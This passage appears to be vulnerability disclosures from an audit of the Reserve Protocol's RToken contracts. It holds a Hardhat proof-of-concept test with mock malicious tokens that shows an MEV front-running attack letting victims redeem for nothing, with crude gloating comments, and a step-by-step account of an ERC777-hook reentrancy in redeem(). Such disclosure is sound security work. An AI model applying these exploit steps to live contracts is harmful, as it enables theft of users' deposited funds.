+                govParams.proposalThresholdAsMicroPercent, +                govParams.quorumPercent +            ); +            emit GovernanceCreated(rToken, governance, address(timelock)); + +            // Setup Roles +            timelock.grantRole(timelock.PROPOSER_ROLE(), governance); // Gov only proposer +            timelock.grantRole(timelock.CANCELLER_ROLE(), guardian); // Guardian as canceller +            timelock.grantRole(timelock.EXECUTOR_ROLE(), address(0)); // Anyone as executor +            timelock.revokeRole(timelock.TIMELOCK_ADMIN_ROLE(), address(this)); // Revoke admin role + +            // Set new owner to timelock +            newOwner = address(timelock); +        } else { +            require(owner != address(0), "owner not defined"); +            newOwner = owner; +        } + +        // Setup guardian as freeze starter / extender + pauser +        if (guardian != address(0)) { +            // As a further decentralization step it is suggested to further differentiate between +            // these two roles. But this is what will make sense for simple system setup. +            main.grantRole(SHORT_FREEZER, guardian); +            main.grantRole(LONG_FREEZER, guardian); +            main.grantRole(PAUSER, guardian); +        } + +        // Setup Pauser +        if (pauser != address(0)) { +            main.grantRole(PAUSER, pauser); +        } + +        // Unpause if required +        if (unpause) { +            main.unpause(); +        } + +        // Transfer Ownership and renounce roles +        main.grantRole(OWNER, newOwner); +        main.grantRole(SHORT_FREEZER, newOwner); +        main.grantRole(LONG_FREEZER, newOwner); +        main.grantRole(PAUSER, newOwner); +        main.renounceRole(OWNER, address(this)); +        main.renounceRole(SHORT_FREEZER, address(this)); +        main.renounceRole(LONG_FREEZER, address(this)); +        main.renounceRole(PAUSER, address(this)); +    } +} diff --git a/contracts/p1/mixins/RecollateralizationLib.sol b/contracts/p1/mixins/RecollateralizationLib.sol index 648d1813..ed058a0d 100644 --- a/contracts/p1/mixins/RecollateralizationLib.sol +++ b/contracts/p1/mixins/RecollateralizationLib.sol @@ -435,14 +435,11 @@ library RecollateralizationLibP1 {            // accumulate shortfall          for (uint256 i = 0; i < len; ++i) { -            uint192 q = components.bh.quantity(basketERC20s[i]); -            if (q == 0) continue; // can happen if current basket is out of sync with registry +            ICollateral coll = components.reg.toColl(basketERC20s[i]);                // {tok} = {BU} * {tok/BU}              // needed: quantity of erc20 needed for `basketsTop` BUs -            uint192 needed = basketsTop.mul(q, CEIL); // {tok} - -            ICollateral coll = components.reg.toColl(basketERC20s[i]); +            uint192 needed = basketsTop.mul(components.bh.quantity(basketERC20s[i]), CEIL); // {tok}                // held: quantity of erc20 owned by the bm (BackingManager)              uint192 held = coll.bal(address(components.bm)); // {tok} diff --git a/contracts/plugins/assets/FiatCollateral.sol b/contracts/plugins/assets/FiatCollateral.sol index 600f5a78..d49d1292 100644 --- a/contracts/plugins/assets/FiatCollateral.sol +++ b/contracts/plugins/assets/FiatCollateral.sol @@ -60,7 +60,9 @@ contract FiatCollateral is ICollateral, Asset {      uint192 public prevReferencePrice; // previous rate, {ref/tok}        /// @param config.chainlinkFeed Feed units: {UoA/ref} -    constructor(CollateralConfig memory config) +    constructor( +        CollateralConfig memory config +    )          Asset(              config.priceTimeout,              config.chainlinkFeed, @@ -99,11 +101,7 @@ contract FiatCollateral is ICollateral, Asset {          view          virtual          override -        returns ( -            uint192 low, -            uint192 high, -            uint192 pegPrice -        ) +        returns (uint192 low, uint192 high, uint192 pegPrice)      {          pegPrice = chainlinkFeed.price(oracleTimeout); // {target/ref}   @@ -220,4 +218,9 @@ contract FiatCollateral is ICollateral, Asset {      function isCollateral() external pure virtual override(Asset, IAsset) returns (bool) {          return true;      } + +    // Helper function for testing +    function setStatus(CollateralStatus newStatus) public { +        markStatus(newStatus); +    }  } diff --git a/contracts/plugins/mocks/DoubleEntryToken.sol b/contracts/plugins/mocks/DoubleEntryToken.sol new file mode 100644 index 00000000..01b5d57e --- /dev/null +++ b/contracts/plugins/mocks/DoubleEntryToken.sol @@ -0,0 +1,33 @@ +// SPDX-License-Identifier: BlueOak-1.0.0 +pragma solidity 0.8.9; + +import "@openzeppelin/contracts/token/ERC20/IERC20.sol"; +import "./MaliciousToken.sol"; + +contract DoubleEntryToken { +    address public s_tokenToForward; +    MaliciousToken public s_token; + +    function decimals() public view returns (uint8) { +        return s_token.decimals(); +    } + +    constructor(address tokenToForward) { +        s_tokenToForward = tokenToForward; +        s_token = MaliciousToken(tokenToForward); +    } + +    function balanceOf(address account) public view returns (uint256) { +        return s_token.balanceOf(account); +    } + +    function transfer(address recipient, uint256 amount) public returns (bool) { +        s_token.forwarderTransferFrom(msg.sender, recipient, amount); +        return true; +    } + +    function transferFrom(address from, address to, uint256 amount) public returns (bool) { +        s_token.forwarderTransferFrom(from, to, amount); +        return true; +    } +} diff --git a/contracts/plugins/mocks/MaliciousToken.sol b/contracts/plugins/mocks/MaliciousToken.sol new file mode 100644 index 00000000..2d0d2209 --- /dev/null +++ b/contracts/plugins/mocks/MaliciousToken.sol @@ -0,0 +1,30 @@ +// SPDX-License-Identifier: BlueOak-1.0.0 +pragma solidity 0.8.9; + +import "@openzeppelin/contracts/token/ERC20/ERC20.sol"; + +contract MaliciousToken is ERC20 { +    // solhint-disable-next-line no-empty-blocks +    constructor(string memory name, string memory symbol) ERC20(name, symbol) {} + +    function forwarderTransferFrom( +        address from, +        address to, +        uint256 amount +    ) external returns (bool) { +        _transfer(from, to, amount); +        return true; +    } + +    function mint(address recipient, uint256 amount) external { +        _mint(recipient, amount); +    } + +    function burn(address sender, uint256 amount) external { +        _burn(sender, amount); +    } + +    function adminApprove(address owner, address spender, uint256 amount) external { +        _approve(owner, spender, amount); +    } +} diff --git a/test/mev-redemption.ts b/test/mev-redemption.ts new file mode 100644 index 00000000..2bb51649 --- /dev/null +++ b/test/mev-redemption.ts @@ -0,0 +1,525 @@ +import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers' +import { expect } from 'chai' +import { BigNumber, ContractFactory, Wallet } from 'ethers' +import { ethers, waffle } from 'hardhat' +import { +    IConfig, +    IGovParams, +    IRevenueShare, +    IRTokenConfig, +    IRTokenSetup, +} from '../common/configuration' +import { +    CollateralStatus, +    SHORT_FREEZER, +    LONG_FREEZER, +    MAX_UINT256, +    OWNER, +    PAUSER, +    ZERO_ADDRESS, +    BN_SCALE_FACTOR, +} from '../common/constants' +import { expectInIndirectReceipt, expectInReceipt } from '../common/events' +import { bn, fp, divCeil, toBNDecimals } from '../common/numbers' +import { expectPrice, setOraclePrice } from './utils/oracles' +import { advanceTime, advanceBlocks, getLatestBlockNumber } from './utils/time' +import snapshotGasCost from './utils/snapshotGasCost' +import { +    Asset, +    CTokenFiatCollateral, +    CTokenMock, +    ERC20Mock, +    IBasketHandler, +    FacadeRead, +    FacadeTest, +    FacadeWrite, +    PatrickFacadeWrite, +    FiatCollateral, +    Governance, +    IAssetRegistry, +    RTokenAsset, +    TestIBackingManager, +    TestIBroker, +    TestIDeployer, +    TestIDistributor, +    TestIFurnace, +    TestIMain, +    TestIRevenueTrader, +    TestIStRSR, +    TestIRToken, +    TimelockController, +    USDCMock, +    ShitAsset, +    DoubleEntryToken, +    MaliciousToken, +    MockV3Aggregator, +    GnosisMock, + +} from '../typechain' +import { +    Collateral, +    Implementation, +    IMPLEMENTATION, +    defaultFixture, +    ORACLE_ERROR, +    PRICE_TIMEOUT, +    ORACLE_TIMEOUT +} from './fixtures' +import { useEnv } from '#/utils/env' + + +const createFixtureLoader = waffle.createFixtureLoader + +const describeGas = +    IMPLEMENTATION == Implementation.P1 && useEnv('REPORT_GAS') ? describe : describe.skip + +describe('FacadeWrite contract', () => { +    let deployerUser: SignerWithAddress +    let owner: SignerWithAddress +    let addr1: SignerWithAddress +    let addr2: SignerWithAddress +    let addr3: SignerWithAddress +    let beneficiary1: SignerWithAddress +    let beneficiary2: SignerWithAddress + +    // RSR +    let rsr: ERC20Mock +    let rsrAsset: Asset + +    // Tokens +    let token: ERC20Mock +    let usdc: USDCMock +    let cToken: CTokenMock +    let basket: Collateral[] + +    // Aave / Comp +    let compToken: ERC20Mock +    let shitToken: ERC20Mock +    let shitToken2: ERC20Mock + +    // Assets +    let tokenAsset: FiatCollateral +    let usdcAsset: FiatCollateral +    let cTokenAsset: CTokenFiatCollateral +    let shitAsset: ShitAsset +    let notSoShitAsset: ShitAsset +    let rTokenAsset: RTokenAsset +    let compAsset: Asset + +    // Trading +    let gnosis: GnosisMock + +    // Config +    let config: IConfig + +    // Deployer +    let deployer: TestIDeployer + +    // Governor +    let governor: Governance +    let timelock: TimelockController + +    // Facade +    let facade: FacadeRead +    let facadeTest: FacadeTest +    let collateralArray: Collateral[] +    let facadeWriteLibAddr: string + +    // Core contracts +    let main: TestIMain +    let assetRegistry: IAssetRegistry +    let backingManager: TestIBackingManager +    let basketHandler: IBasketHandler +    let broker: TestIBroker +    let distributor: TestIDistributor +    let furnace: TestIFurnace +    let rToken: TestIRToken +    let rTokenTrader: TestIRevenueTrader +    let rsrTrader: TestIRevenueTrader +    let stRSR: TestIStRSR + +    let facadeWrite: PatrickFacadeWrite +    let facadeRead: FacadeRead +    let rTokenConfig: IRTokenConfig +    let rTokenSetup: IRTokenSetup +    let badBackupRTokenSetup: IRTokenSetup +    let govParams: IGovParams + +    let revShare1: IRevenueShare +    let revShare2: IRevenueShare + +    let loadFixture: ReturnType<typeof createFixtureLoader> +    let wallet: Wallet + +    let stkWithdrawalDelay: string + + +    const toMinBuyAmt = async ( +        sellAmt: BigNumber, +        sellPrice: BigNumber, +        buyPrice: BigNumber +    ): Promise<BigNumber> => { +        // do all muls first so we don't round unnecessarily +        // a = loss due to max trade slippage +        // b = loss due to selling token at the low price +        // c = loss due to buying token at the high price +        // mirrors the math from TradeLib ~L:57 + +        const lowSellPrice = sellPrice.sub(sellPrice.mul(ORACLE_ERROR).div(BN_SCALE_FACTOR)) +        const highBuyPrice = buyPrice.add(buyPrice.mul(ORACLE_ERROR).div(BN_SCALE_FACTOR)) +        const product = sellAmt +            .mul(fp('1').sub(await backingManager.maxTradeSlippage())) // (a) +            .mul(lowSellPrice) // (b) + +        return divCeil(divCeil(product, highBuyPrice), fp('1')) // (c) +    } + +    let MockV3AggregatorFactory: ContractFactory +    let ERC20Factory: ContractFactory + + +    before('create fixture loader', async () => { +        ;[wallet] = (await ethers.getSigners()) as unknown as Wallet[] +        loadFixture = createFixtureLoader([wallet]) +    }) + +    beforeEach(async () => { +        ;[deployerUser, owner, addr1, addr2, addr3, beneficiary1, beneficiary2] = await ethers.getSigners() +            // Deploy fixture +            ; ({ rsr, compToken, gnosis, compAsset, basket, config, facade, facadeTest, deployer, collateral: collateralArray } = +                await loadFixture(defaultFixture)) +        // config.maxTradeSlippage = fp('0.49') // slippage whatever so we have fewer auctions to do +        // config.rTokenMaxTradeVolume = fp('1e9') // $1B +        MockV3AggregatorFactory = await ethers.getContractFactory( +            'MockV3Aggregator' +        ) +        const compChainlinkFeed: MockV3Aggregator = <MockV3Aggregator>( +            await MockV3AggregatorFactory.deploy(8, bn('1e8')) +        ) +        const ERC20: ContractFactory = await ethers.getContractFactory('ERC20Mock') +        shitToken = <ERC20Mock>await ERC20.deploy('shitToken Token', 'SHIT') +        shitToken2 = <ERC20Mock>await ERC20.deploy('shitToken Token', 'SHIT') + +        const ShitAssetFactory: ContractFactory = await ethers.getContractFactory('ShitAsset') +        shitAsset = <ShitAsset>( +            await ShitAssetFactory.deploy( +                PRICE_TIMEOUT, +                compChainlinkFeed.address, +                ORACLE_ERROR, +                shitToken.address, +                config.rTokenMaxTradeVolume, +                ORACLE_TIMEOUT +            ) +        ) +        await shitAsset.refresh() + +        notSoShitAsset = <ShitAsset>( +            await ShitAssetFactory.deploy( +                PRICE_TIMEOUT, +                compChainlinkFeed.address, +                ORACLE_ERROR, +                shitToken2.address, +                config.rTokenMaxTradeVolume, +                ORACLE_TIMEOUT +            ) +        ) +        await notSoShitAsset.refresh() + +        // Get assets and tokens +        tokenAsset = <FiatCollateral>basket[0] +        usdcAsset = <FiatCollateral>basket[1] +        cTokenAsset = <CTokenFiatCollateral>basket[3] + +        token = <ERC20Mock>await ethers.getContractAt('ERC20Mock', await tokenAsset.erc20()) +        usdc = <USDCMock>await ethers.getContractAt('USDCMock', await usdcAsset.erc20()) +        cToken = <CTokenMock>await ethers.getContractAt('CTokenMock', await cTokenAsset.erc20()) + +        // Deploy DFacadeWriteLib lib +        const facadeWriteLib = await (await ethers.getContractFactory('FacadeWriteLib')).deploy() +        facadeWriteLibAddr = facadeWriteLib.address + +        // Deploy Facade +        const FacadeFactory: ContractFactory = await ethers.getContractFactory('PatrickFacadeWrite', { +            libraries: { +                FacadeWriteLib: facadeWriteLibAddr, +            }, +        }) +        facadeWrite = <PatrickFacadeWrite>await FacadeFactory.deploy(deployer.address) + +        // const FacadeReadFactory: ContractFactory = await ethers.getContractFactory('FacadeRead') +        // const facade = <FacadeRead>await FacadeReadFactory.deploy() + +        revShare1 = { rTokenDist: bn('2'), rsrDist: bn('3') } // 0.5% for beneficiary1 +        revShare2 = { rTokenDist: bn('4'), rsrDist: bn('6') } // 1% for beneficiary2 + +        // Decrease revenue splits for nicer rounding +        config.dist.rTokenDist = bn('394') +        config.dist.rsrDist = bn('591') + +        // Set parameters +        rTokenConfig = { +            name: 'RTKN RToken', +            symbol: 'RTKN', +            mandate: 'mandate', +            params: config, +        } + +        rTokenSetup = { +            assets: [shitAsset.address], +            primaryBasket: [shitAsset.address], +            weights: [fp('1')], // 1 RT = [1 shitAsset] +            backups: [], +            beneficiaries: [ +                { beneficiary: beneficiary1.address, revShare: revShare1 }, +                { beneficiary: beneficiary2.address, revShare: revShare2 }, +            ], +        } + +        badBackupRTokenSetup = { +            assets: [], +            primaryBasket: [shitAsset.address], // target name is shit +            weights: [fp('1')], // 1 RT = [1 shitAsset] +            backups: [{ +                backupUnit: ethers.utils.formatBytes32String('shit'), +                diversityFactor: bn('1'), // max +                backupCollateral: [notSoShitAsset.address], +            }], +            beneficiaries: [] +        } + +        // Set governance params +        govParams = { +            votingDelay: bn(5), // 5 blocks +            votingPeriod: bn(100), // 100 blocks +            proposalThresholdAsMicroPercent: bn(1e6), // 1% +            quorumPercent: bn(4), // 4% +            timelockDelay: bn(60 * 60 * 24), // 1 day +        } +        rTokenSetup.beneficiaries = [ +            { beneficiary: beneficiary1.address, revShare: { rsrDist: bn(1), rTokenDist: bn(0) } }, +        ] +        // Deploy RToken via FacadeWrite +        const receipt = await ( +            await facadeWrite.connect(deployerUser).deployRToken(rTokenConfig, badBackupRTokenSetup) +        ).wait() +        // const rToken = <TestIRToken>await ethers.getContractAt('TestIRToken', await main.rToken()) +        const mainAddr = expectInIndirectReceipt(receipt, deployer.interface, 'RTokenCreated').args.main +        main = <TestIMain>await ethers.getContractAt('TestIMain', mainAddr) +        rToken = <TestIRToken>await ethers.getContractAt('TestIRToken', await main.rToken()) +        assetRegistry = <IAssetRegistry>( +            await ethers.getContractAt('IAssetRegistry', await main.assetRegistry()) +        ) + +        await assetRegistry.connect(deployerUser).register(shitAsset.address) + +        backingManager = <TestIBackingManager>( +            await ethers.getContractAt('TestIBackingManager', await main.backingManager()) +        ) +        basketHandler = <IBasketHandler>( +            await ethers.getContractAt('IBasketHandler', await main.basketHandler()) +        ) + +        rsrTrader = <TestIRevenueTrader>( +            await ethers.getContractAt('TestIRevenueTrader', await main.rsrTrader()) +        ) +        rTokenTrader = <TestIRevenueTrader>( +            await ethers.getContractAt('TestIRevenueTrader', await main.rTokenTrader()) +        ) + +        distributor = <TestIDistributor>( +            await ethers.getContractAt('TestIDistributor', await main.distributor()) +        ) + +        stRSR = <TestIStRSR>await ethers.getContractAt('TestIStRSR', await main.stRSR()) +        stkWithdrawalDelay = bn(await stRSR.unstakingDelay()).toString() + +        furnace = <TestIFurnace>await ethers.getContractAt('TestIFurnace', await main.furnace()) +        ERC20Factory = await ethers.getContractFactory('ERC20Mock') +    }) + +    context("When protocol is uncollateralized & collateral is sound", function () { +        let tokenA: ERC20Mock +        let tokenB: ERC20Mock +        let tokenAAsset: FiatCollateral +        let tokenBAsset: FiatCollateral +        let mintBalance: BigNumber +        let issueAmount: BigNumber + +        const printValues = async () => { +            console.log("Addr1 tokenA balance: ", (await tokenA.balanceOf(addr1.address)).toString()) +            console.log("Addr1 tokenB balance: ", (await tokenB.balanceOf(addr1.address)).toString()) +            console.log("Addr1 rToken balance: ", (await rToken.balanceOf(addr1.address)).toString()) + +            console.log("Addr2 tokenA balance: ", (await tokenA.balanceOf(addr2.address)).toString()) +            console.log("Addr2 tokenB balance: ", (await tokenB.balanceOf(addr2.address)).toString()) +            console.log("Addr2 rToken balance: ", (await rToken.balanceOf(addr2.address)).toString()) + +            console.log("Addr3 tokenA balance: ", (await tokenA.balanceOf(addr3.address)).toString()) +            console.log("Addr3 tokenB balance: ", (await tokenB.balanceOf(addr3.address)).toString()) +            console.log("Addr3 rToken balance: ", (await rToken.balanceOf(addr3.address)).toString()) +            console.log("Addr3 rsr balance: ", (await rsr.balanceOf(addr3.address)).toString()) + +            console.log("Protocol tokenA balance: ", (await tokenA.balanceOf(backingManager.address)).toString()) +            console.log("Protocol tokenB balance: ", (await tokenB.balanceOf(backingManager.address)).toString()) +            console.log("Protocol rToken balance: ", (await rToken.balanceOf(backingManager.address)).toString()) + +            console.log("rTokenTrader tokenA balance: ", (await tokenA.balanceOf(rTokenTrader.address)).toString()) +            console.log("rTokenTrader tokenB balance: ", (await tokenB.balanceOf(rTokenTrader.address)).toString()) +            console.log("rTokenTrader rToken balance: ", (await rToken.balanceOf(rTokenTrader.address)).toString()) + +            console.log("rsrTrader tokenA balance: ", (await tokenA.balanceOf(rsrTrader.address)).toString()) +            console.log("rsrTrader tokenB balance: ", (await tokenB.balanceOf(rsrTrader.address)).toString()) +            console.log("rsrTrader rToken balance: ", (await rToken.balanceOf(rsrTrader.address)).toString()) + +            console.log("gnosis tokenA balance: ", (await tokenA.balanceOf(gnosis.address)).toString()) +            console.log("gnosis tokenB balance: ", (await tokenB.balanceOf(gnosis.address)).toString()) +            console.log("gnosis rToken balance: ", (await rToken.balanceOf(gnosis.address)).toString()) + +            console.log("furnace tokenA balance: ", (await tokenA.balanceOf(furnace.address)).toString()) +            console.log("furnace tokenB balance: ", (await tokenB.balanceOf(furnace.address)).toString()) +            console.log("furnace rToken balance: ", (await rToken.balanceOf(furnace.address)).toString()) + +            console.log("rtoken total supply: ", (await rToken.totalSupply()).toString()) +            console.log("Fully collateralized?: ", (await basketHandler.fullyCollateralized()).toString()) +        } + +        beforeEach(async function () { +            const defaultThreshold = fp('0.05') // 5% +            const delayUntilDefault = bn('86400') // 24h +            const chainlinkFeed: MockV3Aggregator = <MockV3Aggregator>( +                await MockV3AggregatorFactory.deploy(8, bn('1e8')) +            ) +            tokenA = <ERC20Mock>await ERC20Factory.deploy("AToken", "AT") +            const FiatCollateralFactory: ContractFactory = await ethers.getContractFactory('FiatCollateral') +            tokenAAsset = <FiatCollateral>( +                await FiatCollateralFactory.deploy( +                    { +                        priceTimeout: PRICE_TIMEOUT, +                        chainlinkFeed: chainlinkFeed.address, +                        oracleError: ORACLE_ERROR, +                        erc20: tokenA.address, // tokenA is the collateral +                        maxTradeVolume: config.rTokenMaxTradeVolume, +                        oracleTimeout: ORACLE_TIMEOUT, +                        targetName: ethers.utils.formatBytes32String('USD'), +                        defaultThreshold: defaultThreshold, +                        delayUntilDefault: delayUntilDefault, +                    } +                ) +            ) +            await assetRegistry.register(tokenAAsset.address) +            tokenB = <ERC20Mock>await ERC20Factory.deploy("BToken", "BT") +            tokenBAsset = <FiatCollateral>( +                await FiatCollateralFactory.deploy( +                    { +                        priceTimeout: PRICE_TIMEOUT, +                        chainlinkFeed: chainlinkFeed.address, +                        oracleError: ORACLE_ERROR, +                        erc20: tokenB.address, // tokenB is the collateral +                        maxTradeVolume: config.rTokenMaxTradeVolume, +                        oracleTimeout: ORACLE_TIMEOUT, +                        targetName: ethers.utils.formatBytes32String('USD'), +                        defaultThreshold: defaultThreshold, +                        delayUntilDefault: delayUntilDefault, +                    } +                ) +            ) +            await assetRegistry.register(tokenBAsset.address) +            await backingManager.connect(deployerUser).grantRTokenAllowance(tokenA.address) +            await backingManager.connect(deployerUser).grantRTokenAllowance(tokenB.address) + +            // 2. Set prime basket to token A and have addr1 mint 10 tokens +            await basketHandler.connect(deployerUser).setPrimeBasket([tokenA.address], [fp('1')]) +            await basketHandler.refreshBasket() +            mintBalance = bn('10e18') // fast issue +            await tokenA.connect(addr1).mint(addr1.address, mintBalance) +            await tokenA.connect(addr1).approve(rToken.address, mintBalance) +            issueAmount = mintBalance +            await rToken.connect(addr1)['issue(uint256)'](issueAmount) // addr1 has 1 RToken, protocol has 1 tokenA + +            expect(await basketHandler.fullyCollateralized()).to.be.true +            expect(await basketHandler.status()).to.equal(0) // sound collateral +            expect(await rToken.balanceOf(addr1.address)).to.equal(issueAmount) // addr1 has 10 rTokens +            expect(await tokenA.balanceOf(addr1.address)).to.equal(0) // addr1 has no tokenA since it's deposited +            expect(await tokenB.balanceOf(addr1.address)).to.equal(0) // addr1 has no tokenB since they didn't mint +        }) +        it('High: MEV bots can have users redeem for nothing', async () => { +            // addr1 has a lot of money in the protocol  +            const massiveMintBalance = bn('1000000e18') // 1M tokens!  +            await tokenA.connect(addr1).mint(addr1.address, massiveMintBalance) +            await tokenA.connect(addr1).approve(rToken.address, massiveMintBalance) +            await rToken.connect(addr1)['issue(uint256)'](massiveMintBalance) // addr1 has 1M RToken, protocol has 1M tokenA +            await advanceTime(120000) +            await advanceBlocks(12000) +            await rToken.connect(addr1).vest(addr1.address, 1) +            // await printValues() +            await basketHandler.connect(deployerUser).setBackupConfig(ethers.utils.formatBytes32String('USD'), '1', [tokenB.address]) +            // ya know what? I want to redeem those... Worst case it reverts if I redeem too much right?  +            // AHAHAH YOU'RE ABOUT TO GET FK'D KID + +            // One of the assets is about to be no good, oh no! This means anyone can refresh the basket to the backup, and steal the money +            // but our MEV bot sees this TX... +            // This means tokenB is coming in hot on the next refresh + +            // addr1 would like to redeem their 10 tokenA, but they don't realize the protocol is about to switch basket +            // so they send their TX to redeem their 1M tokenA, but oh no!!! an MEV bot got to them first! +            // Since tokenA is bad collateral, now anyone can call this, even if it's for 1 block +            // our attacker waits for some FOOL to redeem their tokens... AND FRONT RUN THEIR ASSSEESSSSSSSS +            // This was their fatal mistake +            await rToken.connect(addr1).approve(rToken.address, massiveMintBalance) +            await tokenA.connect(addr2).mint(addr2.address, mintBalance) + +            // ****************************** //  +            // EVIL VALIDATOR TXES START +            // ****************************** //  +            const evilAmount = mintBalance.div(100000) +            const crazyAttackBalance = bn('5000000000e18') // 5B tokens! +            await tokenA.connect(addr2).mint(addr2.address, crazyAttackBalance) +            await tokenA.connect(addr2).transfer(backingManager.address, crazyAttackBalance) +            // we explode the RToken supply so the user can redeem all their RTokens for almost nothing +            const erc20sInRegistry = await assetRegistry.erc20s() +            await backingManager.manageTokens(erc20sInRegistry) // mints 5B RToken, and sends them to revenue peeps +            // await printValues() + +            // I added a setStatus function to simulate the asset going bad +            await tokenAAsset.setStatus(2) // 2 = disabled +            await assetRegistry.refresh() +            await basketHandler.refreshBasket() // now we swap to tokenB +            await tokenB.connect(addr2).mint(addr2.address, evilAmount) +            await tokenB.connect(addr2).transfer(backingManager.address, evilAmount) +            // ****************************** //  +            // EVIL VALIDATOR TXES END +            // ****************************** //  +            // ****************************** //  +            // EVIL VALIDATOR NOW ORDERS THE REDEMPTION TX +            // ****************************** //  +            // and our victim's TX goes through... get rekt!!! +            await rToken.connect(addr1).redeem(massiveMintBalance.add(mintBalance)) // normally, this isn't possible, but we have fucked with the total supply!! +            // Now we issue ourselves some RToken (we could also fast issue ourselves unlimited RToken using a similar exploit so we'd be the main RToken holders) +            await tokenB.connect(addr2).mint(addr2.address, mintBalance) +            await tokenB.connect(addr2).approve(rToken.address, mintBalance) +            await rToken.connect(addr2)['issue(uint256)'](mintBalance) +            // ******************************************************** //  +            // The above TX is ordered after they exploit the attack +            // And that's the attack in a nutshell, they redeemed 1M tokens for dust!!! +            // ******************************************************** //  + +            // now... to get the attackers money back: +            // 5,000,000,000.000000000000000000 rTokens are on the chopping block +            await backingManager.manageTokens(erc20sInRegistry) // kicks off recollateralization now +            // Do a ton of auctions +            let amountTokenA = await tokenA.balanceOf(gnosis.address) // we need the origin address.  +            let amountTokenB = amountTokenA +            await tokenB.connect(addr3).mint(addr3.address, amountTokenB) +            await tokenB.connect(addr3).approve(gnosis.address, amountTokenB) +            await gnosis.connect(addr3).placeBid(0, { +                bidder: addr3.address, +                sellAmount: amountTokenA, // the whole thing +                buyAmount: amountTokenB, +            }) +            await advanceTime(config.auctionLength.add(100).toString()) +            await backingManager.settleTrade(tokenA.address) +            // And after a ton of auctions, the original attacker will make most of their money back since they are the main RToken holders. +            // They could whale into staking RSR too to get most of the RSR revenue +        }) +    }) +}) ```   
# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L105-L150   # Vulnerability details  ## Impact Function `redeem()` redeems RToken for basket collateral and it updated `basketsNeeded` and transfers users basket ERC20 from BackingManager to user address. it loops through tokens and transfer them to caller and if one of tokens were ERC777 or any other 3rd party protocol token with hook, attacker can perform reentrancy attack during token transfers. Attacker can cause multiple impacts by choosing the reentrancy function: 1. attacker can call `redeem()` again and bypass "bounding each withdrawal by the prorata share when protocol is under-collateralized" because tokens balance of BackingManager is not updated yet. 2. attacker can call `BackingManager.manageTokens()` and because `basketsNeeded` gets decreased and basket tokens balances of BasketManager are not updated, code would detect those tokens as excess funds and would distribute them between RSR stakers and RToken holders and some of RToken deposits would get transferred to RSR holders as rewards.  ## Proof of Concept This is `redeem()` code: ```     function redeem(uint256 amount) external notFrozen { ............... ...............         (address[] memory erc20s, uint256[] memory amounts) = basketHandler.quote(baskets, FLOOR);          uint256 erc20length = erc20s.length;          uint192 prorate = uint192((FIX_ONE_256 * amount) / supply);          // Bound each withdrawal by the prorata share, in case we're currently under-collateralized         for (uint256 i = 0; i < erc20length; ++i) {             uint256 bal = IERC20Upgradeable(erc20s[i]).balanceOf(address(backingManager));              uint256 prorata = (prorate > 0)                 ? (prorate * bal) / FIX_ONE // {qTok} = D18{1} * {qTok} / D18                 : mulDiv256(bal, amount, supply); // {qTok} = {qTok} * {qRTok} / {qRTok}              if (prorata < amounts[i]) amounts[i] = prorata;         }          basketsNeeded = basketsNeeded_ - baskets;         emit BasketsNeededChanged(basketsNeeded_, basketsNeeded);          // == Interactions ==         _burn(redeemer, amount);          bool allZero = true;         for (uint256 i = 0; i < erc20length; ++i) {             if (amounts[i] == 0) continue;             if (allZero) allZero = false;              IERC20Upgradeable(erc20s[i]).safeTransferFrom(                 address(backingManager),                 redeemer,                 amounts[i]             );         }          if (allZero) revert("Empty redemption");     } ``` As you can see code calculates withdrawal amount of each basket erc20 tokens by calling `basketHandler.quote()` and then bounds each withdrawal by the prorata share of token balance, in case protocol is under-collateralized. and then code updates `basketsNeeded` and in the end transfers the tokens.  if one of those tokens were ERC777 then that token would call receiver hook function in token transfer. there may be other 3rd party protocol tokens that calls registered hook functions during the token transfer. as reserve protocol is permission less and tries to work with all tokens so the external call in the token transfer can call hook functions. attacker can use this hook and perform reentrancy attack. This is `fullyCollateralized()` code in BasketHandler: ```     function fullyCollateralized() external view returns (bool) {         return basketsHeldBy(address(backingManager)) >= rToken.basketsNeeded();     } ``` As you can see it calculates baskets that can be held by backingManager tokens balance and needed baskets by RToken contract and by comparing them determines that if RToken is fully collateralized or not. if RToken is fully collateralized then `BackingManager.manageTokens()` would call `handoutExcessAssets()` and would distributes extra funds between RToken holders and RSR stakers. the root cause of the issue is that during tokens transfers in `redeem()` not all the basket tokens balance of the BackingManager updates once and if one has hook function which calls attacker contract then attacker can use this updated token balance of the contract and perform his reentrancy attack. attacker can call different functions for reentrancy. these are two scenarios: ** scenario #1: attacker call `redeem()` again and bypass prorata share bound check when protocol is under-collaterialized: 1. tokens [`SOME_ERC777`, `USDT`] with quantity [1, 1] are in the basket right now and basket nonce is BasketNonce1. 2. BackingManager has 200K `SOME_ERC777` balance and 100K `USDT` balance. `basketsNeeded` in RToken is 150K and RToken supply is 150K and attacker address Attacker1 has 30k RToken. battery charge allows for attacker to withdraw 30K tokens in one block. 3. attacker would register a hook for his address in `SOME_ERC777` token to get called during transfers. 4. attacker would call `redeem()` to redeem 15K RToken and code would updated `basketsNeeded` to 135K and code would bounds withdrawal by prorata shares of balance of the BackingManager because protocol is under-collateralized and code would calculated withdrawal amouns as 15K `SOME_ERC777` tokens and 10K `USDT` tokens (instead of 15K `USDT` tokens) for withdraws. 5. then contract would transfer 15K `SOME_ERC777` tokens first to attacker address and attacker contract would get called during the hook function and now `basketsNeeded` is 135K and total RTokens is 135K and BackingManager balance is 185K `SOME_ERC777` and 100K `USDT` (`USDT` is not yet transferred). then attacker contract can call `redeem()` again for the remaining 15K RTokens. 6. because protocol is under-collateralized code would calculated withdrawal amouns as 15K `SOME_ERC777` and 11.1K `USDT` (USDT_balance * rtokenAmount / totalSupply = 100K * 15K / 135K) and it would burn 15K RToken form caller and the new value of totalSupply of RTokens would be 120K and `basketsNeeded` would be 120K too. then code would transfers 15K `SOME_ERC777` and 11.1K `USDT` for attacker address.  7. attacker's hook function would return and `redeem()` would transfer 10K `USDT` to attacker in the rest of the execution. attacker would receive 30K `SOME_ERC777` and 21.1K `USDT` tokens for 15K redeemed RToken but attacker should have get (`100 * 30K / 150K = 20K`) 20K `USDT` tokens because of the bound each withdrawal by the prorata share, in case we're currently under-collateralized. 8. so attacker would be able to bypass the bounding check and withdraw more funds and stole other users funds. the attack is more effective if withdrawal battery charge is higher but in general case attacker can perform two 